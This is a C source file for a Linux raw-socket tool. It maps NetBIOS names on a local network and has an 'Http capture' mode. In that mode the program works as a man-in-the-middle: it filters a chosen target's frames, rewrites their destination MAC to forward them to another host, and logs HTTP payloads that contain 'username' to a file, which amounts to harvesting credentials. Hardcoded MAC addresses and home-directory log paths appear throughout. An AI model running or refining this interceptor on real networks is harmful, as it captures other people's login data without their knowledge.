#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>
#include <net/if.h> // for ifreq
#include <sys/ioctl.h> //ioctl
#include <time.h>

//ARP file
#define ARP_TABEL  "/proc/net/arp"

//link Layer Sock Discriptor 
typedef struct {
                  unsigned short sll_family;
                  unsigned short sll_protocol;
                  int            sll_ifindex;
                  unsigned short sll_hatype;
                  unsigned char  sll_pkttype;
                  unsigned char  sll_halen;
                  unsigned char  sll_addr[8];  
}__attribute__((packed)) LL_SockAddr;


//Ether Header 14 byte
typedef struct {
                       unsigned char dst_addr[6];
                       unsigned char src_addr[6];
                       unsigned int type : 16;
} __attribute__((packed)) EtherNetFram;

//ARP Header // 28 Byte
typedef struct {
      unsigned char HTYPE[2]; //Hardware type
      unsigned char PTYPE[2]; //Protocol type
      unsigned char HLEN[1];  //Hardware len
      unsigned char PLEN[1];  //Protocol len
      unsigned char OPER[2];  //Opration
      
      unsigned char SHA_2[2]; //Sender hardware Addr *first 2 byte
      unsigned char SHA_4[2]; // nxt 2 byte
      unsigned char SHA_6[2]; // last 2 byte
      
      unsigned char SPA_2[2]; //Sender Protocol Addr *first 2 byte
      unsigned char SPA_4[2]; // last 2 byte

      unsigned char THA_2[2]; //Target Hardware Addr *first 2 byte
      unsigned char THA_4[2];
      unsigned char THA_6[2]; 

      unsigned char TPA_2[2]; //Target Protocol Addr *first 2 byte
      unsigned char TPA_4[2];

}__attribute((packed)) ARP_Packet;


//IP Header 20 byte
typedef struct {
            unsigned int ver : 4; //bit
            unsigned int hl : 4; //bit
            unsigned int tos : 8;
            unsigned int tol : 16;
            unsigned int identity :16;
            unsigned int flags :3;
            unsigned int fragOffset :13;
            unsigned int ttl :8;
            unsigned int protocal :8;
            unsigned int h_chksum :16;
            unsigned char src_addr[4]; //byte
            unsigned char dst_addr[4]; //byte
}__attribute((packed)) IPv4Header;                      

//TCP Header 22 byte
typedef struct {
     unsigned int src_port : 16;
     unsigned int dst_port : 16;
     unsigned int seq_no   : 32;
     unsigned int ack_no   : 32;
     unsigned int offset   : 4;
     unsigned int reserved : 6;
     unsigned int flags    : 6;
     unsigned int window   : 16;
     unsigned int chk_sum  : 16;
     unsigned int urg_ptr  : 32; 

}__attribute((packed)) TCP_packet;

// UDP Header 8 byte
typedef struct {
  unsigned char src_port[2];
  unsigned char dst_port[2];
  unsigned char len[2];
  unsigned char chk_sum[2];
}__attribute((packed)) UDP_packet;

// NetBIOS (UDP) Header 82 byte
typedef struct{
  unsigned int  msg_type     : 8; 
  unsigned int  flags        : 8;
  unsigned int  dataGram_id  : 16;
  unsigned char src_ip[4];
  unsigned int  src_port     : 16;
  unsigned int  dataGram_len : 16;
  unsigned int  data_offset  : 16;
  unsigned char src_name[34];
  unsigned char dst_name[34]; 
}__attribute((packed)) NetBIOS_packet;

//Globel Var
int func = 0; //use to pick program functionality.
int forwardSock;
int receiverSock;
int DataSize;
int run = 1;
int counter = 0;
char devider[] = "\n ********************************************************************";
//forward Data status
int Sendstatus;

int interface_index = 2;
unsigned char own_mac_Add[6] = {0x9c,0x5c,0x8e,0x8e,0x6e,0xbe}; //middel man
unsigned char own_ip_Add[4];

unsigned char target [15]; //i.g 192.150.160.10   
unsigned char target_bin[4]; // ip in binary format
unsigned char target_mac[] =  {0xac,0x87,0xa3,0x2c,0x6b,0xaf};//{0x70,0x54,0xd2,0x44,0x95,0x9e};//lk  //{0xac,0x87,0xa3,0x2c,0x6b,0xaf}; //pk
unsigned char mask [15];  //i.g 192.150.160.101   
unsigned char mask_bin[4]; // ip in binary format
unsigned char mask_mac[6]   = {0xd0,0x17,0xc2,0x9c,0x42,0x28};


//Structures
EtherNetFram eth;
IPv4Header ipv4Header;
TCP_packet tcp;
UDP_packet udp;
NetBIOS_packet netBios;
ARP_Packet arp_packet;
LL_SockAddr ll_sock_disc,ll_sock_disc_rec; 


//Function dec
void getInterface ();

void decodeEther (unsigned char *buff, EtherNetFram *eth, int debug);
void decodeARP (unsigned char *buff, ARP_Packet *arp);
void decodeIPv4 (unsigned char *buff, IPv4Header *ipv4, int debug);
void decodeTCP (unsigned char *buff, TCP_packet *tcp, int debug);
void decodeHttp (unsigned char *buff, int debug);
void decodeUDP (unsigned char *buff, UDP_packet *udp, int debug);
void decodeNetBIOS (unsigned char *buff, NetBIOS_packet *netBios, int debug, int log);
unsigned char * decodeNetBIOS_Name (unsigned char * encoded_name);

void forward (unsigned char *buff, int debug); 
void setUpForwarding ();
void setUpReceveing ();
int  isFromTarget ();
void writeToFile (unsigned char *data,int DataSize);
void getTargetInfo (unsigned char *target, unsigned char *target_mac);
int  find (char *buffer, char *pattern, int len);




void main(){
  
  int MAXMSG = 65536;
  struct sockaddr addr;
  unsigned char buf[MAXMSG];
  
  //Get Interface detail
  getInterface();
  
  //Select functonality
  printf("\n Selecte func .\n  1 for NetBios Mapping\n  2 for Http capture.\n");
  scanf("%d",&func);
  
  if(func == 2){ // Http intercepting 
    //GEt Target ip and Mask mac
    struct sockaddr_in saddr_ip;

    printf("\nTarget src =>");
    scanf("%s",target);
    inet_pton(AF_INET, target, &saddr_ip.sin_addr);
    memcpy(target_bin, &saddr_ip.sin_addr, 4);
    printf("\nTarget src binary to string ipv4 =>%d.%d.%d.%d",(int)target_bin[0],(int)target_bin[1],(int)target_bin[2],(int)target_bin[3]); //debug
    
    getTargetInfo(target,target_mac);
    
    printf("\n\n Mask addr =>");
    scanf("%s",mask);
    inet_pton(AF_INET, mask, &saddr_ip.sin_addr);
    memcpy(mask_bin, &saddr_ip.sin_addr, 4);
    printf("\nTarget dst binary to string ipv4 =>%d.%d.%d.%d",(int)mask_bin[0],(int)mask_bin[1],(int)mask_bin[2],(int)mask_bin[3]); //debug
    
    getTargetInfo(mask,mask_mac);
    // exit(0);
    //Create and bind sock for forwarding
    setUpForwarding();
  }

 
  
  setUpReceveing();
  int debug = 0;
  int size =  sizeof addr;
  int data;
  while(run){
      printf("\n start at : %lu\n", (unsigned long)time(NULL)); 
      DataSize = data = recvfrom(receiverSock, buf, sizeof(buf), 0,NULL,NULL);
      if(data < 0){
        printf("\nCan not get any packets, status :%d",data);
      }
      else{
        //printf("\r.........Intercept Some data size..%d",data);
        if(func == 2){ //func for http intercept
          //Filter
          if( buf[11] != target_mac[5] && buf[10] != target_mac[4]   ||   buf[5] == mask_mac[5] && buf[4] == mask_mac[4]){
              printf("\r Packet droped %d byte ",DataSize);   
              if(debug){
                printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
                printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
                printf("\n type => %02X:%02X",buf[12],buf[13]);

                printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)buf[26], (int)buf[27], (int)buf[28], (int)buf[29]);
                printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)buf[30], (int)buf[31], (int)buf[32], (int)buf[33]);
              }
            continue;
          }
        }

         // EtherNetFram eth;
        decodeEther(buf,&eth,0);

        switch(htons(eth.type)){
          
          case 0x0800:
            // printf("\r\a It's IPv4 Packet."); 
            // IPv4Header ipv4Header;
            decodeIPv4(buf,&ipv4Header,0);
            // continue;
            if(ipv4Header.protocal == 0x06){ // its TCP
              // printf("\n\n It's TCP Packet."); 
              // TCP_packet tcp;
              decodeTCP(buf,&tcp,0);
              // switch(tcp.src_port){
              //    case 137:
              //     printf("\n SMB over TCP");
              //     break;
              //    case 139:
              //     printf("\n SMB over TCP");
              //     break;
              //    default:
              //    break;  

              // }
            }
            else if(ipv4Header.protocal == 0x11){ // UDP Header
              // printf("\n\n It's UDP Packet."); 
              if(func!=1)
               continue;
              decodeUDP(buf,&udp,0);
              // printf("\n UDP port :%02X,%02X",udp.src_port[0],udp.src_port[1]);
              // 0x14e9 (5353) mDns service port 
              if(udp.src_port[0] == 0x14 && udp.src_port[1] == 0xe9){
               printf("\n m DNS Service.");
              }
              if(udp.src_port[0] == 0x00 && udp.src_port[1] == 0x8A){
                 printf("\n m SMG over udp.");
                  decodeNetBIOS(buf,&netBios,0,1);
              }
            }
          break;
          
          case 0x0806:
              // printf("\n It's ARP Packet.\n"); 
              // decodeARP( buf, &arp_packet);
          break;

          case 0x86DD:
              // printf("\n It's IPv6 Packet.\n"); 
          break;
        }
      }
      
    }//While 
  // }
}


//Get interface index & info
void getInterface(){
     
    unsigned char ifName[]={'e','n','p','3','s','0'};  
                             // enp3s0
    struct ifreq ifr;
    memcpy(ifr.ifr_name, ifName, sizeof(ifName));

    int fd = socket(AF_INET,SOCK_DGRAM,0);
    if(fd != -1){
       
       if(ioctl(fd, SIOCGIFINDEX, &ifr) != -1 ){
          printf("\n Enterface :%s index :%d",ifName, ifr.ifr_ifindex);
          interface_index = ifr.ifr_ifindex;
       }
       else{
        printf("\n get interface ioclt failed ...%d \n",errno);
        exit(0);
        }
    
       if(ioctl(fd, SIOCGIFHWADDR, &ifr) != -1){
        memcpy(own_mac_Add, ifr.ifr_hwaddr.sa_data, 6); 
        printf("\n Enterface :%s mac =>%0x:%0x:%0x:%0x:%0x:%0x",ifName,own_mac_Add[0],own_mac_Add[1],own_mac_Add[2],own_mac_Add[3],own_mac_Add[4],own_mac_Add[5]);
       }
       else{
        printf("\n get interface ioclt failed ...%d \n",errno);
        exit(0);
       }
     
       if(ioctl(fd, SIOCGIFADDR, &ifr) != -1){

        struct sockaddr_in *ipAddr = (struct sockaddr_in *) &ifr.ifr_addr;
        struct in_addr *inAddr     = (struct in_addr *) &ipAddr->sin_addr;
        memcpy(own_ip_Add, &inAddr->s_addr, 4);
        printf("\n Enterface :%s ipv4 =>%d.%d.%d.%d",ifName,(int)own_ip_Add[0],(int)own_ip_Add[1],(int)own_ip_Add[2],(int)own_ip_Add[3]);
       }
       else{
        printf("\n get interface ioctl failed ...%d \n",errno);
        exit(0);
       }
  
    }
    else{
     printf("\n get interface info sock creation failed ...%d \n",errno);
     exit(0);}
    
}

//GEt Target info from arp tabel
void getTargetInfo(unsigned char * target, unsigned char *targetMac){
    //find in arp tabel
    
    FILE *arpCache = fopen(ARP_TABEL, "r");
    if(arpCache!=NULL){
      unsigned char buffe[80]; // 79 char par line *79 byte
      char c;
      int i = 0;
      int targetFound = 0;
      do{
          //buffe[i] = (char)fgetc(arpCache);
          //printf("\n i :%d",i); 
          buffe[i] = c =(char)fgetc(arpCache);
          // printf("\n arp Cache len =>%c, hex :%x  i =>%d",buffe[i], buffe[i], i);
          i++;

          if( 0xa == buffe[i-1]){ // on new line
               i = 0;     
             // find target in buffer
             // printf("\n\nfinding Target ......... i :%d",i);
               if( find(buffe,target,15) ){
               printf("\n Target found in Arp tabel.");
               targetFound = 1;
             // get target mac
               targetMac[0] = strtol(&buffe[41],NULL,16);
               targetMac[1] = strtol(&buffe[44],NULL,16);
               targetMac[2] = strtol(&buffe[47],NULL,16);
               targetMac[3] = strtol(&buffe[50],NULL,16);
               targetMac[4] = strtol(&buffe[53],NULL,16);
               targetMac[5] = strtol(&buffe[56],NULL,16);

               printf("\n Target Mac => %02X:%02X:%02X:%02X:%02X:%02X",targetMac[0],targetMac[1],targetMac[2],targetMac[3],targetMac[4],targetMac[5]);
            }
          }
      }
      while( c != EOF && !targetFound);
      //
       printf("\n arp cache file closed :%d",fclose(arpCache) );
      if(!targetFound){
        printf("\n Target Not found in ARP Tabel.");
        exit(0);
      }
    }
}

// Receiving socket
void setUpReceveing(){
 receiverSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003)); 
    if(receiverSock > 0){
      
      printf("\n Receiver socket is created ....");

      // initialize link layer sock discriptor 
      ll_sock_disc_rec.sll_family   = AF_PACKET; // AF_PACKET *default
      ll_sock_disc_rec.sll_protocol = htons(0x0003); // Not required  0 for nothing
      ll_sock_disc_rec.sll_ifindex  = interface_index;
      ll_sock_disc_rec.sll_hatype   = 0; // Not required  0 for nothing
      ll_sock_disc_rec.sll_pkttype  = '0'; // Not required  0 for nothing
      ll_sock_disc_rec.sll_halen    = '6';
      memcpy(ll_sock_disc_rec.sll_addr, &target_mac, 6);
      

       //debug ll sock
       printf("\n\n family :%d",ll_sock_disc_rec.sll_family);
       printf("\n protocol :%d",ll_sock_disc_rec.sll_protocol);
       printf("\n if index :%d",ll_sock_disc_rec.sll_ifindex);
       printf("\n hatype :%d",ll_sock_disc_rec.sll_hatype);
       printf("\n pkt type :%c",ll_sock_disc_rec.sll_pkttype);
       printf("\n ha-len :%02x",ll_sock_disc_rec.sll_halen);
       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc_rec.sll_addr[0], ll_sock_disc_rec.sll_addr[1], ll_sock_disc_rec.sll_addr[2], ll_sock_disc_rec.sll_addr[3], ll_sock_disc_rec.sll_addr[4], ll_sock_disc_rec.sll_addr[5]);
       
       printf("\n receiver LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc_rec));

      
        //Bind
         int bindStatus = bind(receiverSock, (struct sockaddr *)&ll_sock_disc_rec, sizeof (ll_sock_disc_rec) );
         printf("\n\n receiver bind status :%d, errorCode :%d",bindStatus,errno); 
         if(bindStatus == -1)
           exit(0);
    }
    else{
      printf("\n receiver sock creation failed :%d",errno);
      exit(0);
    }

} 

// Sending socket
void setUpForwarding(){

    forwardSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
    if(forwardSock > 0){
       printf("\n Forward socket is created ....");

      // initialize link layer sock discriptor 
      ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
      ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
      ll_sock_disc.sll_ifindex  = interface_index;
      ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
      ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
      ll_sock_disc.sll_halen    = '6';
      memcpy(ll_sock_disc.sll_addr, &mask_mac, 6);
      

       //debug ll sock
       printf("\n\n family :%d",ll_sock_disc.sll_family);
       printf("\n protocol :%d",ll_sock_disc.sll_protocol);
       printf("\n if index :%d",ll_sock_disc.sll_ifindex);
       printf("\n hatype :%d",ll_sock_disc.sll_hatype);
       printf("\n pkt type :%c",ll_sock_disc.sll_pkttype);
       printf("\n ha-len :%02x",ll_sock_disc.sll_halen);
       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc.sll_addr[0], ll_sock_disc.sll_addr[1], ll_sock_disc.sll_addr[2], ll_sock_disc.sll_addr[3], ll_sock_disc.sll_addr[4], ll_sock_disc.sll_addr[5]);
       
       printf("\n LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc));

      
        //Bind
         int bindStatus = bind(forwardSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
         printf("\n\n forward sock bind status :%d, errorCode :%d",bindStatus,errno); 
         if(bindStatus == -1)
           exit(0);
    }
    else{
      printf("\n forawrd sock creation failed :%d",errno);
      exit(0);
    }

}

// Forward packet to mask
void forward(unsigned char *buf,int debug){
  printf("\n Forwarding Data...%d",DataSize);
  Sendstatus = send(forwardSock, buf, DataSize, 0);
  printf("\n Data Forward status... %d",Sendstatus);
  
  if(debug){
       printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
       printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
       printf("\n type => %02X:%02X",buf[12],buf[13]);

       printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)buf[26], (int)buf[27], (int)buf[28], (int)buf[29]);
       printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)buf[30], (int)buf[31], (int)buf[32], (int)buf[33]);
  }
  writeToFile(buf,DataSize);
  printf("\n Forwrding Done...... %d \n",Sendstatus);
  printf("\n forwding End : %lu\n", (unsigned long)time(NULL));
  // if(Sendstatus < 0){
  //   printf("\n forwarding failed ..%d",errno);
  // }
  // else{
  //   printf("\n forwarded data ..%d",Sendstatus);
  // }
}

//Patern Match
int find(char *buffer, char *pattern, int pattern_len){
   //here 0x20 is 'space' charecter in assci
   for(int i=0; i<pattern_len; i++){
      // printf("\n matcheing => %02x == %02x",buffer[i],pattern[i]); //Debug
      if(pattern[i] != 0x00){
        if (buffer[i] != 0x20){
          if(buffer[i] != pattern[i])
            return 0;
        }
        else
          return 0;
      }
      else if(buffer[i] != 0x20)
       return 0;
      
    } 
  //  exit(0);
   return 1;  
} 

//Chk if packet from target
int isFromTarget(){
  // printf("\n checking target ip");
  
  if(target_bin[3] ==  (int)ipv4Header.src_addr[3])
      return 1;
  else
    return 0;
}

void writeToFile(unsigned char *data, int len){ 
 FILE *logFile = fopen("/home/satyaprakash/Algo/logSendRaw.txt","ab");
      if(logFile == NULL){
        printf("Failed to open file ..\n");
      }
      else{
         printf("\n writing to File data %d",len);
         fwrite(devider,1,71,logFile); //Devider         
         fwrite(data,1,len,logFile); 
         fclose(logFile);
        //  exit(0);
      }
} 


//**********************Decoders************************//

//DeCode EtherNet
void decodeEther(unsigned char *buf, EtherNetFram *eth, int debug ){
    if(debug){
       printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
       printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
       printf("\n type => %02X:%02X",buf[12],buf[13]);
      }
       memcpy(eth,buf,14);
}

//Decode ARP
void decodeARP(unsigned char *buf, ARP_Packet *arp){
  memcpy(arp, &buf[14], 28);
  
  printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
  printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
  printf("\n src raw :%s",eth.src_addr);
  printf("\n type => %02X:%02X",buf[12],buf[13]);

  printf("\n Htype %02X,%02X",arp_packet.HTYPE[0],arp_packet.HTYPE[1]);
  printf("\n Ptype :%02x:%02x",arp_packet.PTYPE[0],arp_packet.PTYPE[1]);
  printf("\n OPER  :%02X,%02X",arp_packet.OPER[0],arp_packet.OPER[1]);
  printf("\n HLEN :%02X",arp_packet.HLEN[0]); 
  printf("\n PLEN :%02X",arp_packet.PLEN[0]);

  if(arp_packet.OPER[1] == 0x01){
    printf("  Request");
  }
  else{
    printf("  Replay");
  }

  printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.SHA_2[0],arp_packet.SHA_2[1], arp_packet.SHA_4[0],arp_packet.SHA_4[1], arp_packet.SHA_6[0],arp_packet.SHA_6[1]);
  printf("  SPA => %d.%d.%d.%d",(int)arp_packet.SPA_2[0],(int)arp_packet.SPA_2[1], (int)arp_packet.SPA_4[0],(int)arp_packet.SPA_4[1]);
  printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.THA_2[0],arp_packet.THA_2[1], arp_packet.THA_4[0],arp_packet.THA_4[1], arp_packet.THA_6[0],arp_packet.THA_6[1]);
  printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
}

// DeCode IPv4 Header
void decodeIPv4(unsigned char *buf, IPv4Header *ipv4, int debug){
   memcpy(ipv4, &buf[14], 20);
   if(debug){
    printf("\n protocal :%02X",ipv4->protocal);
    printf("\n header len :%d",ipv4->hl);
    printf("\n payload len :%d",htons(ipv4->tol));
    printf("\n frag flags :%03X",ipv4->flags);  
    // printf("\n Type of Service :%02X\n",ipv);   
    // printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4->src_addr[0], (int)ipv4->src_addr[1], (int)ipv4->src_addr[2], (int)ipv4->src_addr[3]);
    // printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4->dst_addr[0], (int)ipv4->dst_addr[1], (int)ipv4->dst_addr[2], (int)ipv4->dst_addr[3]);
   }
}  

//Decode TCP PAcket
void decodeTCP(unsigned char *buf, TCP_packet *tcp, int debug){
  memcpy(tcp,&buf[34],22);
 
  if(debug){
    printf("\n source port :%d",htons(tcp->src_port));
    printf("\n destination port :%d",htons(tcp->dst_port));
    printf("\n data offset :%02X",tcp->offset);
    printf("\n window :%02X",tcp->window);
    int dataStart = (tcp->offset) * 4;
    printf("\n data start :%d",dataStart);
  }

  int dataStart = (tcp->offset) * 4;
  if(debug)
    printf("\n data start :%d",dataStart);

  if(func == 2){
     decodeHttp(buf,0);  
  
   // 65 Header Size
  //  printf("\n payload size :%d",DataSize);
   
  //  if( (int)htons(tcp->dst_port) == 80 || (int)htons(tcp->src_port) == 80 ){
  //   // printf("\n HTTP data.."); 
  //   int header = 65 + dataStart;
  //   if(DataSize - header > 0){
  //       unsigned char data [DataSize-header];
  //       // printf("\n Header Size :%d",header);
  //       // printf("\n data size :%lu",sizeof(data));
  //       memcpy(data,&buf[header], DataSize-header);

  //       // printf("\n HTTP.. Payload ...");
  //       // printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
  //       // printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
        
  //       // //chk is trafic from target then forward
  //       //int st = isFromTarget();

  //       if(isFromTarget()){
  //         printf("\n Is from target");
  //         //Forward the tarfic 
  //          memcpy(buf, &mask_mac, 6); // dst mac to mask mac 
  //         //  memcpy(&buf[6], &targetMac, 6); // change src mac back to target
  //          forward(buf);
  //         //  exit(0);
  //        if(strstr(data, "username"))
  //         writeToFile(data,sizeof(data));
  //       }
  //   }
  //  }
  }
}

// Decode Http Packet
void decodeHttp(unsigned char *buf,int debug){

  int dataStart = (tcp.offset) * 4;
  if(debug)
    printf("\n data start :%d",dataStart);
  
   // 65 Header Size
  //  printf("\n payload size :%d",DataSize);
   
   if( (int)htons(tcp.dst_port) == 80 || (int)htons(tcp.src_port) == 80 ){
    // printf("\n HTTP data.."); 
    int header = 65 + dataStart;
    if(DataSize - header > 0){
        unsigned char data [DataSize-header];
        
        memcpy(data,&buf[header], DataSize-header);
        if(debug){
          printf("\n HTTP.. Payload ...");
          printf("\n Header Size :%d",header);
          printf("\n data size :%lu",sizeof(data));
          printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
          printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
        }
        if(isFromTarget()){
          printf("\n Is from target");
          //Forward the tarfic 
           memcpy(buf, &mask_mac, 6); // dst mac to mask mac 
          //  memcpy(&buf[6], &targetMac, 6); // change src mac back to target
           forward(buf,1);
          //  exit(0);
         if(strstr(data, "username"))
          writeToFile(data,sizeof(data));
        }
    }
   }
}

//Decode UDP 
void decodeUDP(unsigned char *buf, UDP_packet *udp, int debug){
  memcpy(udp,&buf[34],8);
  if(debug){
    printf("\n src port :%02X,%02X",udp->src_port[0],udp->src_port[1]);
    printf("\n dst port :%02X,%02X",udp->dst_port[0],udp->dst_port[1]);
    printf("\n len :%02X,%02X",udp->len[0],udp->len[1]);
   }
}

//Decode NetBIOS
void decodeNetBIOS(unsigned char *buf, NetBIOS_packet *netBios, int debug, int log){
  memcpy(netBios, &buf[42] ,82);

  //debug
  if(debug){
    printf("\n src ip :%d.%d.%d.%d",(int)netBios->src_ip[0],(int)netBios->src_ip[1],(int)netBios->src_ip[2],(int)netBios->src_ip[3]);
    printf("\n src port :%d",(int)htons(netBios->src_port));
    printf("\n src name :%s",netBios->src_name);
    unsigned char *decoded = decodeNetBIOS_Name(netBios->src_name);
    printf("\n Decoded src :%s",decoded);
    free(decoded);
  }
    
  //write to file
  if(log){ 
    //  inet_pton(AF_INET, target, &saddr_ip.sin_addr);
    FILE *logFile = fopen("/home/satyaprakash/Algo/log-NetBIOS-Map.txt","ar");
      if(logFile == NULL){
        printf("Failed to open file ..\n");
      }
      else{
         
         //chk duplicat entrys
        //  char ch;
        //  int i = 0;//0-5 mac len
        //  while(( ch = fgetc(logFile)) != EOF){
        //     if(ch == eth.src_addr[i] || ch == 0x3a){ // 0x3a == ":"
        //      if(ch != 0x3a)
        //        i += 1;
        //     }
        //     else
        //      i = 0;

        //     if(i==6){
        //       printf("\n Duplicate skip.");
        //       break;
        //     }
        //  } 
         
        //  if(i == 6){
        //    printf("\n function break");
        //     return;
        //   }
           
         printf("\n writing to File data");
         fwrite(devider,1,71,logFile); //Devider
         //src Mac 
         fprintf(logFile,"\n src-mac: %02X:%02X:%02X:%02X:%02X:%02X",eth.src_addr[0], eth.src_addr[1], eth.src_addr[2], eth.src_addr[3], eth.src_addr[4], eth.src_addr[5]);
         //dst Mac 
        //  fprintf(logFile,"\n dst-mac: %02X:%02X:%02X:%02X:%02X:%02X",eth.dst_addr[0], eth.dst_addr[1], eth.dst_addr[2], eth.dst_addr[3], eth.dst_addr[4], eth.dst_addr[5]);
         //src ip
         fprintf(logFile,"\n src-ip: %d.%d.%d.%d",(int)netBios->src_ip[0],(int)netBios->src_ip[1],(int)netBios->src_ip[2],(int)netBios->src_ip[3]);
         // src port
         fprintf(logFile,"\n src-port: %d",(int)htons(netBios->src_port));
         // src name
         unsigned char *decoded_src = decodeNetBIOS_Name(netBios->src_name);
         fprintf(logFile,"\n src: %s",decoded_src);
         free(decoded_src);
         //dst name
         unsigned char *decoded_dst = decodeNetBIOS_Name(netBios->dst_name);
         fprintf(logFile,"\n dst: %s",decoded_dst);
         free(decoded_dst);

         fclose(logFile);
        //  exit(0);
      }
  }
}

//Decode NetBIOS Name
unsigned char* decodeNetBIOS_Name(unsigned char *encoded_name){
  unsigned char A = 0x41; // ascii A in hex
  unsigned char x,y;
  unsigned char *decoded = (unsigned char *)malloc(16);
  int j=0;
  for(int i=1; i < 34; i+=2){
      x = encoded_name[i];
      y = encoded_name[i+1];
      
      // printf("\n norm x : %02x, %02x ", x,A);
      x = x - A;
      // printf(". norm x-! : %02x ", x);
      x = x << 4;
      // printf(". norm x << 4 : %02x",x);
      
      // printf("\n norm y : %02x, %02x ", y,A);
      y = y - A;
      // printf(". norm y-A : %02x",y);

      x = x + y;
      // printf("\n final X :%04x ascii :%c",x,x);
      decoded[j] = x;
      j+=1;
  } 

  return decoded;
}
